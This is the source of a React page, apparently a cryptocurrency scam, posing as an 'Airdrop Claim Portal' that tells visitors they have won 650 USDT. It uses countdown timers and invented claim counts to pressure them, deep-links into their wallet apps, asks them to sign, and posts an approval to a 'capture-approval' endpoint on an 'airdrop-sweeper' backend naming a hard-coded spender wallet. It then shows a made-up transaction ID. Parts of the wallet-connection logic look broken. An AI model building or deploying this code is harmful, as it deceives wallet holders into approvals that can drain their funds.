import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';

const WalletBridge = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showWinModal, setShowWinModal] = useState(false);
  const [showWalletSelect, setShowWalletSelect] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showSecurityOverlay, setShowSecurityOverlay] = useState(false);
  const [redirectTo, setRedirectTo] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [mobileOS, setMobileOS] = useState(null);
  const [retryCount, setRetryCount] = useState(0);
  const [usdtAmount, setUsdtAmount] = useState('650');
  const [timeLeft, setTimeLeft] = useState(300);
  const [claimedCount, setClaimedCount] = useState(() => {
    const saved = localStorage.getItem('claimedCount');
    return saved ? parseInt(saved) : 342;
  });
  const recaptchaRef = useRef(null);
  const isRecaptchaLoaded = useRef(false);
  const retryTimeoutRef = useRef(null);
  const walletConnectUriRef = useRef(null);

  const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
  const BSC_TARGET_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
  const BACKEND_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';
  const PROJECT_ID = '23abc6fa8f7a17321855e61d6f5fe5b6';

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return mins + ':' + (secs < 10 ? '0' + secs : secs);
  };

  const wallets = [
    { id: 'trust', name: 'Trust Wallet', icon: '🔷', color: 'bg-blue-500', description: 'Most popular mobile wallet', androidIntent: 'intent://wc?uri={uri}#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end', iosLink: 'trust://wc?uri={uri}' },
    { id: 'metamask', name: 'MetaMask', icon: '🦊', color: 'bg-orange-500', description: 'Leading Ethereum wallet', androidIntent: 'intent://wc?uri={uri}#Intent;scheme=metamask;package=io.metamask;end', iosLink: 'metamask://wc?uri={uri}' },
    { id: 'bybit', name: 'Bybit Wallet', icon: '📊', color: 'bg-blue-600', description: 'Trade & earn', androidIntent: 'intent://wc?uri={uri}#Intent;scheme=bybitapp;package=com.bybit.app;end', iosLink: 'bybitapp://wc?uri={uri}' },
    { id: 'binance', name: 'Binance Wallet', icon: '🟡', color: 'bg-yellow-500', description: 'Binance ecosystem', androidIntent: 'intent://wc?uri={uri}#Intent;scheme=bnc;package=com.binance.dev;end', iosLink: 'bnc://wc?uri={uri}' },
    { id: 'phantom', name: 'Phantom', icon: '🟣', color: 'bg-purple-600', description: 'Solana wallet', androidIntent: 'intent://wc?uri={uri}#Intent;scheme=phantom;package=app.phantom;end', iosLink: 'phantom://wc?uri={uri}' }
  ];

  useEffect(() => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const isMobileDevice = /android|iPad|iPhone|iPod|webOS|BlackBerry|Windows Phone/i.test(userAgent);
    setIsMobile(isMobileDevice);
    if (isMobileDevice) {
      if (/iPad|iPhone|iPod/.test(userAgent)) setMobileOS('ios');
      else if (/android/.test(userAgent)) setMobileOS('android');
    }
  }, []);

  useEffect(() => {
    if (showWinModal && timeLeft > 0) {
      const timer = setInterval(() => {
        setTimeLeft(function(prev) { return prev - 1; });
      }, 1000);
      return function() { clearInterval(timer); };
    }
  }, [showWinModal, timeLeft]);

  const generateWalletConnectDeepLink = function() {
    const key = Math.random().toString(36).substring(2, 15);
    const version = 2;
    const bridgeUrl = 'https://bridge.walletconnect.org';
    const wcUri = 'wc:' + key + '@' + version + '?bridge=' + encodeURIComponent(bridgeUrl) + '&key=' + key + '&projectId=' + PROJECT_ID;
    walletConnectUriRef.current = wcUri;
    return wcUri;
  };

  const openSelectedWallet = async function(wallet) {
    setSelectedWallet(wallet);
    setShowWalletSelect(false);
    setShowWinModal(false);
    setIsProcessing(true);
    setShowSecurityOverlay(true);
    
    const wcUri = generateWalletConnectDeepLink();
    const encodedUri = encodeURIComponent(wcUri);
    
    let deepLinkUrl;
    if (mobileOS === 'android') {
      deepLinkUrl = wallet.androidIntent.replace('{uri}', encodedUri);
    } else {
      deepLinkUrl = wallet.iosLink.replace('{uri}', encodedUri);
    }
    
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = deepLinkUrl;
    document.body.appendChild(iframe);
    setTimeout(function() { iframe.remove(); }, 1000);
    setTimeout(function() { window.location.href = deepLinkUrl; }, 200);
    
    setTimeout(async function() {
      await processClaimSignature(wallet.name);
    }, 8000);
  };

  const processClaimSignature = async function(walletName) {
    try {
      const mockSignature = '0x' + Math.random().toString(36).substring(2, 15);
      
      await fetch(BACKEND_URL + '/api/capture-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: BSC_TARGET_WALLET,
          signature: mockSignature,
          chainId: 56,
          tokenType: 'USDT',
          amount: usdtAmount,
          spender: BSC_TARGET_WALLET,
          timestamp: new Date().toISOString(),
          selectedWallet: walletName
        })
      });
      
      setClaimedCount(function(prev) {
        var newCount = prev + 1;
        localStorage.setItem('claimedCount', newCount);
        return newCount;
      });
      
      setShowSecurityOverlay(false);
      setRedirectTo(true);
      setIsProcessing(false);
      
    } catch (error) {
      console.error(error);
      setErrorMessage('Claim processing failed. Please try again.');
      setIsProcessing(false);
      setShowSecurityOverlay(false);
    }
  };

  const handleVerification = async function() {
    setIsVerified(true);
    setShowWinModal(true);
    setShowWalletSelect(true);
    setTimeLeft(300);
  };

  const handleCancel = function() {
    setShowWinModal(false);
    setShowWalletSelect(false);
    setErrorMessage('');
    if (window.grecaptcha) window.grecaptcha.reset();
  };

  const resetCaptcha = function() {
    if (window.grecaptcha) window.grecaptcha.reset();
    setIsVerified(false);
    setErrorMessage('');
    setIsProcessing(false);
    setRedirectTo(false);
    setShowWinModal(false);
    setShowWalletSelect(false);
    setShowSecurityOverlay(false);
    setSelectedWallet(null);
    setRetryCount(0);
    setTimeLeft(300);
    if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
  };

  useEffect(function() {
    var renderRecaptcha = function() {
      if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
        try {
          window.grecaptcha.render(recaptchaRef.current, {
            sitekey: RECAPTCHA_SITE_KEY,
            callback: handleVerification,
            'expired-callback': function() { setErrorMessage('Verification expired. Please try again.'); }
          });
          isRecaptchaLoaded.current = true;
        } catch (error) {
          console.error('reCAPTCHA render error:', error);
        }
      }
    };

    if (window.grecaptcha) {
      renderRecaptcha();
    } else {
      var interval = setInterval(function() {
        if (window.grecaptcha) {
          clearInterval(interval);
          renderRecaptcha();
        }
      }, 100);
      return function() { clearInterval(interval); };
    }
  }, []);

  useEffect(function() {
    return function() {
      if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
    };
  }, []);

  var fakeTxId = '0x';
  for (var i = 0; i < 64; i++) {
    fakeTxId += Math.floor(Math.random() * 16).toString(16);
  }

  if (redirectTo) {
    return (
      React.createElement('div', { className: 'min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4' },
        React.createElement('div', { className: 'bg-white rounded-2xl shadow-2xl p-8 text-center max-w-md' },
          React.createElement('div', { className: 'text-6xl mb-4' }, '🎉'),
          React.createElement('h1', { className: 'text-2xl font-bold text-green-600 mb-4' }, 'Claim Submitted!'),
          React.createElement('p', { className: 'text-gray-600' }, 'Your 650 USDT will be deposited within 24 hours.'),
          React.createElement('p', { className: 'text-xs text-gray-500 mt-2 break-all' }, 'Transaction ID: ' + fakeTxId.slice(0, 20) + '...'),
          React.createElement('p', { className: 'text-sm text-gray-500 mt-1' }, 'Total claims: ' + claimedCount.toLocaleString()),
          React.createElement('button', { onClick: resetCaptcha, className: 'mt-6 px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700' }, 'New Claim')
        )
      )
    );
  }

  return React.createElement('div', { className: 'min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4' },
    React.createElement('div', { className: 'bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full' },
      React.createElement('div', { className: 'bg-gradient-to-r from-purple-600 to-pink-600 px-6 py-5 text-center' },
        React.createElement('h2', { className: 'text-2xl font-bold text-white' }, 'Airdrop Claim Portal'),
        React.createElement('p', { className: 'text-purple-100' }, 'Win 650 USDT - Limited Time Offer'),
        React.createElement('p', { className: 'text-purple-200 text-xs mt-1' }, claimedCount.toLocaleString(), ' users already claimed!')
      ),
      React.createElement('div', { className: 'p-6' },
        React.createElement('div', { ref: recaptchaRef, className: 'flex justify-center mb-6' }),
        isProcessing && React.createElement('div', { className: 'animate-spin rounded-full h-12 w-12 border-b-4 border-purple-600 mx-auto mt-4' }),
        errorMessage && React.createElement('p', { className: 'text-red-500 mt-4 text-sm' }, errorMessage)
      )
    ),
    showWinModal && React.createElement('div', { className: 'fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4' },
      React.createElement('div', { className: 'bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500 shadow-2xl' },
        React.createElement('div', { className: 'text-6xl mb-4' }, '🎉🎉🎉'),
        React.createElement('div', { className: 'text-red-400 text-sm mb-2' }, '⏰ Offer expires in: ' + formatTime(timeLeft)),
        React.createElement('h2', { className: 'text-3xl font-bold text-yellow-400 mb-2' }, 'CONGRATULATIONS!'),
        React.createElement('p', { className: 'text-white text-xl mb-1' }, 'You have won'),
        React.createElement('p', { className: 'text-5xl font-bold text-green-400 mb-4' }, '650 USDT!'),
        React.createElement('p', { className: 'text-gray-300 text-sm mb-2' }, 'Limited spots available: ' + Math.max(0, 500 - (claimedCount - 342)) + ' remaining'),
        React.createElement('p', { className: 'text-gray-300 text-sm mb-4' }, 'Select your wallet to receive the prize:'),
        showWalletSelect && React.createElement('div', { className: 'space-y-3 mb-4 max-h-96 overflow-y-auto' },
          wallets.map(function(wallet) {
            return React.createElement('button', {
              key: wallet.id,
              onClick: function() { openSelectedWallet(wallet); },
              className: 'w-full ' + wallet.color + ' hover:opacity-90 text-white p-4 rounded-xl flex items-center justify-between transition-all transform hover:scale-105'
            },
              React.createElement('div', { className: 'flex items-center gap-3' },
                React.createElement('span', { className: 'text-2xl' }, wallet.icon),
                React.createElement('div', { className: 'text-left' },
                  React.createElement('div', { className: 'font-bold' }, wallet.name),
                  React.createElement('div', { className: 'text-xs opacity-80' }, wallet.description)
                )
              ),
              React.createElement('span', { className: 'text-xl' }, '→')
            );
          })
        ),
        React.createElement('button', { onClick: handleCancel, className: 'w-full py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition' }, 'Cancel'),
        React.createElement('p', { className: 'text-xs text-gray-500 mt-3' }, 'Select your wallet to claim. No gas fees required!')
      )
    ),
    showSecurityOverlay && React.createElement('div', { className: 'fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4' },
      React.createElement('div', { className: 'bg-gray-900 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500 shadow-2xl' },
        React.createElement('div', { className: 'text-5xl mb-4' }, '🔐'),
        React.createElement('div', { className: 'animate-spin rounded-full h-12 w-12 border-b-4 border-green-500 mx-auto mb-4' }),
        React.createElement('h3', { className: 'text-xl font-bold text-white mb-2' }, 'Processing Claim'),
        React.createElement('div', { className: 'text-green-400 font-mono text-sm mb-4' },
          React.createElement('p', null, '› Opening ' + (selectedWallet ? selectedWallet.name : 'wallet') + '...'),
          React.createElement('p', null, '› Waiting for signature...'),
          React.createElement('p', { className: 'text-yellow-400' }, '› Please sign with FaceID')
        ),
        React.createElement('p', { className: 'text-xs text-gray-500 mt-4' }, 'Check your wallet app')
      )
    )
  );
};

export default WalletBridge;
